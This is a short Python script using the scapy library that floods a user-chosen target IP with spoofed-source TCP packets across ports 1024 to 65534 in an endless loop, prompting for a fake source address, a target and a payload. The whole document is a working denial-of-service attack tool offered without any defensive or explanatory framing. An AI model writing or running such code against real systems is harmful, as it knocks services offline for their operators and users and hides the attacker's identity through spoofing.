from scapy.all import *

def synFlood(source, target, message):
    for dport in range(1024, 65535):
        IPlayer = IP(src=source, dst=target)
        TCPlayer = TCP(sport=4444, dport=dport)
        RAWlayer = Raw(load=message)
        packet = IPlayer/TCPlayer/RAWlayer
        send(packet)
        
source = input("Enter SOURCE IP address to fake: ")
target = input("Enter TARGET IP address: ")
message = input("Enter MESSAGE fro TCP PAYLOAD: ")

while True:
    synFlood(source, target, message)